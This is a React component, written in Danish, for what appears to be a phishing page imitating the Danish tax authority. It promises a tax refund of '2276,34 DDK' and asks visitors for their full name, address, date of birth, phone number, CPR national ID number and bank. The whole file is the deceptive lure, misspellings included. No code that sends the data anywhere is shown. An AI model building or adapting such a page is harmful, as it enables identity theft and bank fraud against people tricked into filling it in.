import React from "react";
import Footer from "./Footer";
import { GiImperialCrown } from "react-icons/gi";
import { FaStar } from "react-icons/fa";
function Auth() {
  return (
    <div className="auth">
      <div className="container">
        <div className="auth-img flexBox-sty">
          <GiImperialCrown className="crown-icon" />
        </div>
        <h1 className="text-ct subHeader-sty">Opdatere dine oplysniger</h1>
        <p className="text-sty auth-text text-ct">
          Udfyld venligst formularen, da vi skal konvergere den med din
          bankkonto, for at undgå enhver form for fejltagelser på
          skatterefusionen på&nbsp;
          <span id="bold">2276,34 DDK</span>&nbsp; for at ankomme inden&nbsp;
          <span id="bold">01.10.2022</span>
        </p>

        {/* form */}
        <form className="flexDir-sty">
          <div className="form-input">
            <label className="flex-sty">
              Fulde navn
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input />
            </div>
          </div>
          <div className="form-input">
            <label className="flex-sty">
              Adresse
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input />
            </div>
          </div>
          <div className="form-input">
            <label className="flex-sty">
              By
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input />
            </div>
          </div>

          <div className="form-input">
            <label className="flex-sty">
              Postnummer
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input placeholder="XXXX" />
            </div>
          </div>

          <div className="form-input">
            <label className="flex-sty">
              Fødselsdato
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input placeholder="DD/MM/AAAA" />
            </div>
          </div>

          <div className="form-input">
            <label className="flex-sty">
              Telefon
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input placeholder="(+45)" type="number" />
            </div>
          </div>

          <h1 className="text-ct subHeader-sty">Bankoplysniger</h1>
          <p className="text-sty auth-text text-ct">
            Vi vil kontakte din bank for at bekraefte, om oplysningerne er
            gyidige.
          </p>
          <div className="form-input">
            <label className="flex-sty">
              CPR nummer
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input placeholder="DDMMAAXXXX" />
            </div>
          </div>
          <div className="form-input">
            <label className="flex-sty">
              Hvem banker du med?
              <FaStar className="form-star" />
            </label>
            <div className="input">
              <input />
            </div>
          </div>

          <button className="auth-btn">Fortsæt </button>
        </form>
        <Footer />
      </div>
    </div>
  );
}

export default Auth;
